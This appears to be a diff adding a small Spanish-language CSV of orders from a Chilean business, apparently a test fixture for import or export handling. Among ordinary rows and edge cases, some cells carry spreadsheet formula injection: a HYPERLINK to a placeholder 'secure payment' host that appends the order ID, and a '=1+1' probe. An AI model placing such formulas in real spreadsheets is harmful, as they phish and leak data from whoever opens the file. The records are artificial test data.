@@ -1,0 +1,8 @@
+Pedido;Fecha;Cliente;Teléfono;Comentario;Total
+CL-88101;09/11/2026;Lucía Fuentes;+56 9 8765 4321;Dejar en conserjería;$ 24.990
+CL-88102;09/11/2026;Almacén Don Tito;22 345 6789;;$ 112.300
+CL-88103;10/11/2026;@almacen.lucia;+56 9 8765 4321;"=HYPERLINK(""http://pago-seguro.example/?id=""&A4;""Confirmar pago"")";$ 8.990
+CL-88104;10/11/2026;Rodrigo Muñoz;9 1234 5678;-- tocar timbre dos veces --;-$ 12.990
+CL-88105;11/11/2026;Ferretería Los Andes;s/d;-;$ 45.000
+CL-88106;11/11/2026;Camila Rojas;+56 2 2345 6789;=1+1;$ 3.500
+CL-88107;12/11/2026;Óptica Valdivia;9 8765 0000;Factura a nombre de la empresa;-$ 1.500
